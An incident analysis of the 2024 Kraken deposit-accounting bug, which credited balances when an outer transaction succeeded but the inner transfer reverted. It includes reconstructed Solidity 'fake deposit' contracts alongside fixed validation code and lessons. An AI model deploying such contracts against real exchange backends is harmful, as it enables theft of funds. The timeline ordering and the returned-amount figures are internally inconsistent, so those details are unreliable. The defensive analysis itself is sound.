# Kraken — Accounting Error Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05-24 (initial contract deployment) / 2024-06-09 (vulnerability reported) |
| **Protocol** | Kraken (centralized exchange) |
| **Chain** | Base (Coinbase L2) |
| **Loss** | ~$3,000,000 (Kraken operational funds) |
| **Attacker** | CertiK Skyfall Team (claimed whitehat research) |
| **Attack Contract** | [0x45...CeA9](https://basescan.org/address/0x45cea9) (Base chain, deployed 2024-05-24) |
| **Attack Tx** | Multiple on-chain evidence — Base, BNB Chain, Arbitrum, Optimism |
| **Vulnerable Contract** | Kraken deposit processing backend (off-chain accounting system) |
| **Root Cause** | Failure to distinguish internal transfer status in deposit transactions — immediate credit on main transaction success without detecting internal revert |
| **PoC Source** | Not listed in DeFiHackLabs (actual CertiK research team exploit) |

---

## 1. Vulnerability Overview

Kraken exchange introduced a feature that immediately reflects balances in accounts before deposit transactions are fully confirmed, intended to improve user experience (UX). This change was made to allow users to trade cryptocurrency in real time immediately after depositing.

However, this change led to a critical accounting error, because Kraken's deposit processing system failed to properly distinguish the various internal states (success/failure/revert) of blockchain transactions.

The core vulnerability mechanism is as follows:

1. **Revert Attack**: The attacker deployed a smart contract that crafted transactions with the following structure:
   - Outer main transaction: success (`status: 1`)
   - Inner deposit sub-transaction: failure/revert (`status: 0`)

2. **Internal Transfer Status Confusion**: Kraken's backend detected only the success status of the outer transaction and credited the deposit amount to the user's account, failing to recognize that the inner deposit sub-transaction had reverted.

3. **Phantom Asset Withdrawal**: Kraken processed withdrawal requests for funds that were never actually deposited, resulting in approximately $3 million worth of cryptocurrency being withdrawn.

This vulnerability had existed since approximately January 2024. The CertiK research team is analyzed to have first detected and verified the vulnerability by deploying a test contract on the Base chain on May 24, 2024. The same vulnerability was subsequently attempted at multiple centralized exchanges including Binance, OKX, BingX, and Gate.io, but large-scale fund extraction succeeded only at Kraken.

---

## 2. Vulnerable Code Analysis

### 2.1 Deposit Status Handling Error (Core Vulnerability)

Kraken's deposit processing system monitors blockchain transactions from an off-chain backend. The vulnerable logic is estimated as follows:

```python
# ❌ Vulnerable deposit processing logic (pseudocode — estimated actual implementation)
def process_deposit(tx_hash: str, user_account: str, amount: int):
    tx_receipt = get_transaction_receipt(tx_hash)
    
    # ❌ Only checks outer transaction status — does not validate inner sub-transaction status
    if tx_receipt.status == 1:  # Outer transaction success
        # Immediately credit account balance (process as deposit complete)
        credit_account(user_account, amount)
        # ❌ Problem: even if the internal deposit transfer reverted,
        #    deposit is processed as long as the outer transaction succeeded
```

**Fixed Code**:

```python
# ✅ Fixed deposit processing logic
def process_deposit(tx_hash: str, user_account: str, amount: int):
    tx_receipt = get_transaction_receipt(tx_hash)
    
    # ✅ Check outer transaction status
    if tx_receipt.status != 1:
        return  # Ignore failed transaction
    
    # ✅ Validate internal Transfer event logs
    deposit_events = filter_transfer_events(
        tx_receipt.logs,
        to_address=KRAKEN_DEPOSIT_ADDRESS,
        token=expected_token
    )
    
    # ✅ Verify that actual deposit events exist and amounts match
    if not deposit_events or sum(e.amount for e in deposit_events) < amount:
        reject_deposit(tx_hash, "No deposit event or amount mismatch")
        return
    
    # ✅ Additional validation for contract revert
    internal_calls = get_internal_transactions(tx_hash)
    reverted_calls = [c for c in internal_calls if c.status == 0]
    if any(is_deposit_related(c) for c in reverted_calls):
        reject_deposit(tx_hash, "Internal deposit sub-call revert detected")
        return
    
    credit_account(user_account, amount)
```

**Issue**: Kraken only checked the outer status of deposit transactions for UX improvement (real-time balance reflection) and did not validate whether the inner sub-transactions (actual token transfers) had reverted. This allowed account balances to be inflated without any actual fund movement through a contract that "pretends to deposit."

### 2.2 Revert Attack Smart Contract (Attack Tool)

The structure of the smart contract used by the attacker is estimated as follows:

```solidity
// ❌ Revert attack contract — appears to deposit but actual transfer reverts
// Deployed on Base chain 2024-05-24 (0x45...CeA9)
contract RevertDepositAttack {
    address immutable exchange;       // Kraken deposit address
    IERC20 immutable token;           // Deposit token
    
    // Function signature hash: 0xa04a4c3b (not publicly disclosed)
    function executeRevertDeposit(uint256 amount) external {
        // ❌ Step 1: Outer transaction executes successfully
        //    Kraken monitoring system detects this transaction as a "deposit"
        
        // Call that induces an internal revert
        try token.transfer(exchange, amount) {
            // ❌ Force revert inside the transfer call
            // Appears to Kraken as a successful transfer, but tokens are not actually sent
        } catch {
            // Catch the revert so the outer transaction completes normally
        }
        
        // ❌ Result: tx.status = 1 (success), actual balance change = none
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker (CertiK research team) deployed a test revert attack contract on the Base chain on May 24, 2024
- Confirmed vulnerability existence with small amounts (proof of concept)
- Attempted the same vulnerability on Binance (BNB Chain), OKX, BingX, and Gate.io as well (May 29 – June 5, 2024)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Kraken Revert Attack Flow                        │
└─────────────────────────────────────────────────────────────────────┘

  [Attacker]
      │
      │ 1. Call revert attack contract (Base chain)
      ▼
┌─────────────────────────┐
│   RevertDeposit         │
│   Contract (Base)       │
│   0x45...CeA9           │
└────────────┬────────────┘
             │
             │ 2. Call token.transfer()
             │    (Main TX: status=1 success)
             ▼
┌─────────────────────────┐      ┌─────────────────────────┐
│  Inner Sub-Transaction  │      │   Kraken Deposit Address │
│  transfer(exchange, amt)│─────▶│   (No actual tokens      │
│  ⚠️  Internal revert   │      │    received)             │
│     occurs             │      │   No balance change      │
└─────────────────────────┘      └─────────────────────────┘
             │
             │ 3. Outer TX completes as success (status=1)
             ▼
┌─────────────────────────┐
│   Kraken Backend         │
│   Monitoring System      │
│   TX status=1 detected → │
│   ❌ Processed as        │
│      deposit complete    │
└────────────┬────────────┘
             │
             │ 4. User account balance increases
             │    (Credited without actual deposit)
             ▼
┌─────────────────────────┐
│   Attacker Account       │
│   Balance                │
│   +$X phantom credit     │
└────────────┬────────────┘
             │
             │ 5. Immediate withdrawal request
             │    (Phantom balance → real cryptocurrency)
             ▼
┌─────────────────────────┐
│   Kraken Withdrawal      │
│   Processing             │
│   ✅ Approved normally   │
│   Actual funds withdrawn │
└────────────┬────────────┘
             │
             │ 6. Real funds transferred to attacker's wallet
             ▼
  [Attacker Wallet]
  ~$3,000,000 received
  (ETH, USDT, XMR, etc.)
```

### 3.3 Outcome

- **Amount withdrawn by attacker**: ~$3,000,000
  - 734.19215 ETH
  - 29,001 USDT
  - 1021.1 XMR
- **Amount Kraken requested returned**: $2,900,000+
  - 155,818.4468 MATIC
  - 907,400.1803 USDT
  - 475.5557871 ETH
  - 1,089.794737 XMR
- **Final outcome**: Full return minus some fees (CertiK claimed whitehat conduct)
- **Kraken's position**: Immediately filed criminal charges

---

## 4. PoC Code (Reference)

This incident is an actual event not listed in DeFiHackLabs with a PoC. The core logic of the contract used by the CertiK research team is reconstructed as follows.

```solidity
// Core pattern of revert attack (estimated reconstruction)
// The same function signature 0xa04a4c3b was used in attacks against multiple exchanges

contract DepositRevertAttack {
    // Step 1: Configure exchange deposit address and token
    address public immutable TARGET_EXCHANGE;
    IERC20 public immutable DEPOSIT_TOKEN;
    
    constructor(address _exchange, address _token) {
        TARGET_EXCHANGE = _exchange;
        DEPOSIT_TOKEN = IERC20(_token);
    }
    
    // Step 2: Execute attack function (signature 0xa04a4c3b)
    function triggerFakeDeposit(uint256 amount) external {
        // Appears to be a normal deposit transaction on the surface
        // Internally structured to deceive exchange monitoring
        // without actually transferring tokens
        
        // Method A: Catch the revert midway so that
        //           the outer TX ends as success
        try this._internalTransfer(amount) {} catch {}
        
        // Result: tx.status = 1, no actual balance movement
        // Exchange backend processes as "deposit success"
    }
    
    function _internalTransfer(uint256 amount) external {
        // This internal function always reverts
        DEPOSIT_TOKEN.transferFrom(msg.sender, TARGET_EXCHANGE, amount);
        revert("intentional revert"); // ← Key: force revert after actual transfer
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Internal Transaction Status Not Validated (Accounting Error) | CRITICAL | CWE-840 |
| V-02 | Premature Balance Credit (Race Condition) | HIGH | CWE-362 |
| V-03 | Transaction Finality Validation Absent | HIGH | CWE-345 |

### V-01: Internal Transaction Status Not Validated (Accounting Error)

- **Description**: Kraken's deposit processing system only checked the outer success status of blockchain transactions (tx.status = 1) and did not validate whether inner sub-transactions (actual token transfers) had failed or reverted. In the Ethereum EVM, even if the outer transaction succeeds, internal `call`s can revert, and handling them with `try/catch` allows the entire transaction to complete in a success state.
- **Impact**: Exchange account balances could be inflated without limit without any actual fund movement. This was effectively a "money printer" vulnerability, where attackers used phantom balances to withdraw real cryptocurrency.
- **Attack conditions**: 
  - Knowledge of the exchange deposit address
  - Ability to deploy a revert-pattern contract (basic Solidity development knowledge)
  - An account capable of withdrawing immediately after deposit processing

### V-02: Premature Balance Credit (Race Condition)

- **Description**: A feature was added to immediately reflect deposit balances before block finality, intended to improve UX. This created a window where funds could be used while the deposit was still incomplete.
- **Impact**: Funds could be traded or withdrawn before a deposit was fully finalized.
- **Attack conditions**: Timing manipulation between deposit and withdrawal, or combined with a revert attack

### V-03: Transaction Finality Validation Absent

- **Description**: The exchange backend did not sufficiently validate the finality of deposit transactions. Multiple validations such as the existence of Transfer event logs and the success status of internal call traces were absent.
- **Impact**: Trusting a single transaction hash for deposits made the system vulnerable to forgery and manipulation.
- **Attack conditions**: Any technique that makes only the outer transaction hash appear valid

---

## 6. Remediation Recommendations

### Immediate Actions

```python
# ✅ Enhanced deposit processing — multi-layer validation applied

def process_deposit_secure(tx_hash: str, user_account: str, 
                           expected_amount: int, expected_token: str):
    """
    Secure deposit processing: multi-layer validation including internal transaction status
    """
    # Step 1: Basic transaction status check
    tx_receipt = get_transaction_receipt(tx_hash)
    if tx_receipt.status != 1:
        return reject_deposit(tx_hash, "Outer transaction failed")
    
    # Step 2: Mandatory Transfer event log validation
    transfer_logs = get_transfer_events(
        tx_receipt.logs,
        token=expected_token,
        to=KRAKEN_DEPOSIT_ADDRESS
    )
    
    if not transfer_logs:
        return reject_deposit(tx_hash, "No Transfer event — suspected revert attack")
    
    actual_amount = sum(log.amount for log in transfer_logs)
    if actual_amount < expected_amount:
        return reject_deposit(tx_hash, f"Amount mismatch: {actual_amount} < {expected_amount}")
    
    # Step 3: Internal transaction trace validation (defense against revert attacks)
    internal_txs = get_internal_transactions(tx_hash)  # debug_traceTransaction
    for internal_tx in internal_txs:
        if (internal_tx.to == KRAKEN_DEPOSIT_ADDRESS 
                and internal_tx.status == 0):  # Internal revert
            return reject_deposit(tx_hash, "Internal deposit call revert detected")
    
    # Step 4: Block confirmation count check (high-value deposits)
    current_block = get_latest_block()
    tx_block = tx_receipt.block_number
    confirmations = current_block - tx_block
    
    if expected_amount > HIGH_VALUE_THRESHOLD and confirmations < MIN_CONFIRMATIONS:
        return queue_pending_deposit(tx_hash, user_account, expected_amount)
    
    # All validations passed — safely credit
    credit_account(user_account, actual_amount)
    log_deposit_audit(tx_hash, user_account, actual_amount)
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01 Internal status not validated | Mandate full internal call trace validation via `debug_traceTransaction` |
| V-01 Accounting error | Mandatory validation of Transfer event log existence + amount match |
| V-02 Premature credit | Credit high-value deposits only after N block confirmations; apply a cap to instant credit amounts |
| V-03 Finality absent | Separate deposit processing into stages (pending → confirmed → credited) |
| General security | Real-time detection of abnormal deposit patterns (repeated same pattern, small test deposit followed by large deposit) |
| Anomaly detection | Additional validation layer for transactions where the transfer amount is abnormal relative to gas fees |

---

## 7. Lessons Learned

1. **Understand the layered state of blockchain transactions**: In the EVM, the success of an outer transaction (status=1) does not guarantee the success of internal sub-calls. Centralized exchanges and DeFi protocols must always detect reverts in internal calls wrapped with `try/catch`.

2. **UX improvements must not sacrifice security**: The "real-time deposit reflection" feature provides convenience to users, but premature credit without deposit finality validation becomes a critical vulnerability. To balance security and UX, a policy is needed to apply instant credit only to small amounts and process high-value deposits after multiple block confirmations.

3. **Deposit processing requires multiple validation layers**: Deposit validation that relies on a single indicator (tx.status) is vulnerable. Multiple independent indicators such as Transfer event logs, internal call traces, and block confirmation counts must be cross-validated.

4. **The boundary between whitehat research and actual exploitation must be clearly defined**: CertiK actually withdrew $3 million after discovering the vulnerability, which is a serious violation of the industry's bug bounty ethics standards. Genuine whitehat research should stop at writing a PoC and small proof-of-concept tests; actual fund withdrawal cannot be justified under any circumstances.

5. **The same vulnerability may exist across multiple exchanges**: This vulnerability was applicable not only to Kraken but also to major centralized exchanges including Binance and OKX. Exchanges should regularly conduct mutual audits of deposit processing systems and establish industry standards for common vulnerability patterns.

6. **Smart contract-based attacks leave on-chain evidence**: The contract the attacker deployed on the Base chain remains as permanent on-chain evidence, enabling reconstruction of the attack timeline. Exchanges must have systems in place to monitor deposit contract abnormal behavior in real time.

---

## 8. On-Chain Verification

### 8.1 Incident Timeline (Based on On-Chain Evidence)

| Date | Event | Chain |
|------|--------|------|
| 2024-05-24 | CertiK-affiliated address deploys revert attack contract | Base |
| 2024-05-17 | Same-pattern attack attempt detected (reported by Hexagate) | BNB Chain |
| 2024-05-29 ~ 06-05 | Same attempt on OKX, BingX, Gate.io | BNB Chain, Arbitrum, Optimism |
| 2024-06-05 | CertiK officially claims vulnerability discovery |  |
| 2024-06-09 | Bug bounty report submitted to Kraken |  |
| 2024-06-09 | Kraken completes patch within 47 minutes |  |
| 2024-06-19 | Kraken CSO public announcement — criminal charges filed |  |
| 2024-06-20 | CertiK completes full return of funds |  |

### 8.2 PoC vs. On-Chain Amount Comparison

| Item | Claimed Amount | On-Chain Actual | Notes |
|------|-----------|-------------|------|
| Total withdrawn | ~$3,000,000 | ~$3,000,000 | Match |
| ETH returned | — | 734.19215 ETH | CertiK return |
| USDT returned | — | 29,001 USDT | CertiK return |
| XMR returned | — | 1021.1 XMR | CertiK return |
| Kraken-requested ETH | — | 475.5557871 ETH | Kraken calculation |
| Kraken-requested USDT | — | 907,400.1803 USDT | Kraken calculation |
| Fee loss | — | Small amount | Discrepancy |

> Note: A discrepancy between CertiK's returned amount and Kraken's requested amount led to a dispute. Some funds were reported to have been moved through Tornado Cash.

### 8.3 Attack Identification Indicators

- CertiK-affiliated addresses and unknown addresses share the same function signature hash `0xa04a4c3b`
- This function signature is not registered in a public database (4byte.directory), suggesting it was intentionally obfuscated
- Base chain contract `0x45...CeA9` is confirmed to have been deployed two weeks before the Kraken attack

---

*Reference Sources*:
- [The Hacker News — Kraken Crypto Exchange Hit by $3 Million Theft](https://thehackernews.com/2024/06/kraken-crypto-exchange-hit-by-3-million.html)
- [BleepingComputer — Researchers exploit Kraken exchange bug, steal $3 million](https://www.bleepingcomputer.com/news/security/researchers-exploit-kraken-exchange-bug-steal-3-million-in-crypto/)
- [DL News — CertiK bug found in Kraken used on other crypto exchanges](https://www.dlnews.com/articles/defi/certik-bug-found-in-kraken-used-on-other-crypto-exchanges/)
- [CoinDesk — Kraken Says Hackers Turned to Extortion After Exploiting Bug for $3M](https://www.coindesk.com/business/2024/06/19/kraken-says-hackers-turned-to-extortion-after-exploiting-bug-for-3m/)
- [Decrypt — Kraken Lost Almost $3 Million After Bug Allowed Users to Print Money](https://decrypt.co/236119/kraken-3-million-bug-print-money)
- [Blockchain Intelligence Group — On-Chain Tracing Of $3M Exploited](https://blockchaingroup.io/investigation-insights/on-chain-tracing-of-3m-exploited-and-returned-in-kraken-white-hat-attack/)
- [Bitdefender — Zero-Day Exploit in Kraken](https://www.bitdefender.com/en-us/blog/hotforsecurity/zero-day-exploit-in-kraken-crypto-exchange-leads-to-3-million-theft)